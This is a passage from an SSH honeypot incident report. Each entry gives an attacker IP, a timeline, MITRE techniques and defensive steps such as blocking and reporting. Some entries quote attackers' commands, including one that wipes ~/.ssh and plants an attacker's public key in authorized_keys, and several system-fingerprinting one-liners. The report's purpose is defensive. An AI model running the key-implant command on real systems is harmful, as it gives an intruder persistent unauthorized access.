|---|---|
| `2026-08-30 12:10:01` | `cowrie.session.connect` |
| `2026-08-30 12:10:01` | `cowrie.client.version` |
| `2026-08-30 12:10:01` | `cowrie.client.kex` |
| `2026-08-30 12:10:02` | `cowrie.login.success` |
| `2026-08-30 12:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966369a96569

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-30 12:10 |
| **Last Seen** | 2026-08-30 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:10:05` | `cowrie.session.connect` |
| `2026-08-30 12:10:05` | `cowrie.client.version` |
| `2026-08-30 12:10:05` | `cowrie.client.kex` |
| `2026-08-30 12:10:05` | `cowrie.login.success` |
| `2026-08-30 12:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ef3ccd588c

| Field | Detail |
|---|---|
| **Source IP** | `88.147.30[.]59` |
| **First Seen** | 2026-08-30 12:10 |
| **Last Seen** | 2026-08-30 12:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:10:45` | `cowrie.session.connect` |
| `2026-08-30 12:10:45` | `cowrie.client.version` |
| `2026-08-30 12:10:45` | `cowrie.client.kex` |
| `2026-08-30 12:10:45` | `cowrie.login.success` |
| `2026-08-30 12:10:46` | `cowrie.session.params` |
| `2026-08-30 12:10:46` | `cowrie.command.input` |
| `2026-08-30 12:10:46` | `cowrie.command.failed` |
| `2026-08-30 12:10:46` | `cowrie.log.closed` |
| `2026-08-30 12:10:47` | `cowrie.session.params` |
| `2026-08-30 12:10:47` | `cowrie.command.input` |
| `2026-08-30 12:10:47` | `cowrie.session.file_download` |
| `2026-08-30 12:10:47` | `cowrie.log.closed` |
| `2026-08-30 12:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.147.30[.]59` to AbuseIPDB if not already reported
- [ ] Block `88.147.30[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c1760a16509

| Field | Detail |
|---|---|
| **Source IP** | `88.147.30[.]59` |
| **First Seen** | 2026-08-30 12:10 |
| **Last Seen** | 2026-08-30 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:10:47` | `cowrie.session.connect` |
| `2026-08-30 12:10:47` | `cowrie.client.version` |
| `2026-08-30 12:10:47` | `cowrie.client.kex` |
| `2026-08-30 12:10:48` | `cowrie.login.success` |
| `2026-08-30 12:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.147.30[.]59` to AbuseIPDB if not already reported
- [ ] Block `88.147.30[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1255b4bf58c3

| Field | Detail |
|---|---|
| **Source IP** | `88.147.30[.]59` |
| **First Seen** | 2026-08-30 12:10 |
| **Last Seen** | 2026-08-30 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:10:48` | `cowrie.session.connect` |
| `2026-08-30 12:10:48` | `cowrie.client.version` |
| `2026-08-30 12:10:48` | `cowrie.client.kex` |
| `2026-08-30 12:10:49` | `cowrie.login.success` |
| `2026-08-30 12:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.147.30[.]59` to AbuseIPDB if not already reported
- [ ] Block `88.147.30[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abab6b32bc0d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:10 |
| **Last Seen** | 2026-08-30 12:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:10:54` | `cowrie.session.connect` |
| `2026-08-30 12:10:54` | `cowrie.client.version` |
| `2026-08-30 12:10:54` | `cowrie.client.kex` |
| `2026-08-30 12:10:56` | `cowrie.login.success` |
| `2026-08-30 12:10:58` | `cowrie.session.params` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.success` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.command.input` |
| `2026-08-30 12:10:58` | `cowrie.log.closed` |
| `2026-08-30 12:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7802033bcf1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:11 |
| **Last Seen** | 2026-08-30 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:11:40` | `cowrie.session.connect` |
| `2026-08-30 12:11:40` | `cowrie.client.version` |
| `2026-08-30 12:11:40` | `cowrie.client.kex` |
| `2026-08-30 12:11:40` | `cowrie.login.success` |
| `2026-08-30 12:11:41` | `cowrie.session.params` |
| `2026-08-30 12:11:41` | `cowrie.command.input` |
| `2026-08-30 12:11:41` | `cowrie.log.closed` |
| `2026-08-30 12:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e678016d3e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:12 |
| **Last Seen** | 2026-08-30 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:12:15` | `cowrie.session.connect` |
| `2026-08-30 12:12:15` | `cowrie.client.version` |
| `2026-08-30 12:12:15` | `cowrie.client.kex` |
| `2026-08-30 12:12:16` | `cowrie.login.success` |
| `2026-08-30 12:12:16` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:12:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:12:16` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6f776b776a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:12 |
| **Last Seen** | 2026-08-30 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:12:40` | `cowrie.session.connect` |
| `2026-08-30 12:12:40` | `cowrie.client.version` |
| `2026-08-30 12:12:40` | `cowrie.client.kex` |
| `2026-08-30 12:12:41` | `cowrie.login.success` |
| `2026-08-30 12:12:41` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:12:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:12:41` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55129c83810a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:12 |
| **Last Seen** | 2026-08-30 12:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:12:42` | `cowrie.session.connect` |
| `2026-08-30 12:12:43` | `cowrie.client.version` |
| `2026-08-30 12:12:43` | `cowrie.client.kex` |
| `2026-08-30 12:12:45` | `cowrie.login.success` |
| `2026-08-30 12:12:47` | `cowrie.session.params` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.success` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.command.input` |
| `2026-08-30 12:12:47` | `cowrie.log.closed` |
| `2026-08-30 12:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f72a1e144c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:13 |
| **Last Seen** | 2026-08-30 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:13:47` | `cowrie.session.connect` |
| `2026-08-30 12:13:47` | `cowrie.client.version` |
| `2026-08-30 12:13:48` | `cowrie.client.kex` |
| `2026-08-30 12:13:48` | `cowrie.login.success` |
| `2026-08-30 12:13:49` | `cowrie.session.params` |
| `2026-08-30 12:13:49` | `cowrie.command.input` |
| `2026-08-30 12:13:49` | `cowrie.log.closed` |
| `2026-08-30 12:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69ce381f145

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:14 |
| **Last Seen** | 2026-08-30 12:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:14:26` | `cowrie.session.connect` |
| `2026-08-30 12:14:27` | `cowrie.client.version` |
| `2026-08-30 12:14:27` | `cowrie.client.kex` |
| `2026-08-30 12:14:28` | `cowrie.login.success` |
| `2026-08-30 12:14:30` | `cowrie.session.params` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.success` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.command.input` |
| `2026-08-30 12:14:30` | `cowrie.log.closed` |
| `2026-08-30 12:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e21cef67f32

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:16 |
| **Last Seen** | 2026-08-30 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:16:06` | `cowrie.session.connect` |
| `2026-08-30 12:16:06` | `cowrie.client.version` |
| `2026-08-30 12:16:06` | `cowrie.client.kex` |
| `2026-08-30 12:16:06` | `cowrie.login.success` |
| `2026-08-30 12:16:07` | `cowrie.session.params` |
| `2026-08-30 12:16:07` | `cowrie.command.input` |
| `2026-08-30 12:16:07` | `cowrie.log.closed` |
| `2026-08-30 12:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3026640a022

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:16 |
| **Last Seen** | 2026-08-30 12:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:16:15` | `cowrie.session.connect` |
| `2026-08-30 12:16:15` | `cowrie.client.version` |
| `2026-08-30 12:16:15` | `cowrie.client.kex` |
| `2026-08-30 12:16:17` | `cowrie.login.success` |
| `2026-08-30 12:16:18` | `cowrie.session.params` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.success` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.command.input` |
| `2026-08-30 12:16:18` | `cowrie.log.closed` |
| `2026-08-30 12:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01eefa18e04b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:17 |
| **Last Seen** | 2026-08-30 12:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:17:59` | `cowrie.session.connect` |
| `2026-08-30 12:18:00` | `cowrie.client.version` |
| `2026-08-30 12:18:00` | `cowrie.client.kex` |
| `2026-08-30 12:18:02` | `cowrie.login.success` |
| `2026-08-30 12:18:03` | `cowrie.session.params` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.success` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:03` | `cowrie.command.input` |
| `2026-08-30 12:18:04` | `cowrie.log.closed` |
| `2026-08-30 12:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed9bfeedf82

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:18 |
| **Last Seen** | 2026-08-30 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:18:20` | `cowrie.session.connect` |
| `2026-08-30 12:18:20` | `cowrie.client.version` |
| `2026-08-30 12:18:20` | `cowrie.client.kex` |
| `2026-08-30 12:18:20` | `cowrie.login.success` |
| `2026-08-30 12:18:21` | `cowrie.session.params` |
| `2026-08-30 12:18:21` | `cowrie.command.input` |
| `2026-08-30 12:18:21` | `cowrie.log.closed` |
| `2026-08-30 12:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35b603d4a7b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:19 |
| **Last Seen** | 2026-08-30 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:19:47` | `cowrie.session.connect` |
| `2026-08-30 12:19:48` | `cowrie.client.version` |
| `2026-08-30 12:19:48` | `cowrie.client.kex` |
| `2026-08-30 12:19:49` | `cowrie.login.success` |
| `2026-08-30 12:19:50` | `cowrie.session.params` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.success` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:50` | `cowrie.command.input` |
| `2026-08-30 12:19:51` | `cowrie.log.closed` |
| `2026-08-30 12:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e083dde17864

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:20 |
| **Last Seen** | 2026-08-30 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:20:38` | `cowrie.session.connect` |
| `2026-08-30 12:20:38` | `cowrie.client.version` |
| `2026-08-30 12:20:38` | `cowrie.client.kex` |
| `2026-08-30 12:20:38` | `cowrie.login.success` |
| `2026-08-30 12:20:39` | `cowrie.session.params` |
| `2026-08-30 12:20:39` | `cowrie.command.input` |
| `2026-08-30 12:20:39` | `cowrie.log.closed` |
| `2026-08-30 12:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c069661cb01

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:21 |
| **Last Seen** | 2026-08-30 12:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
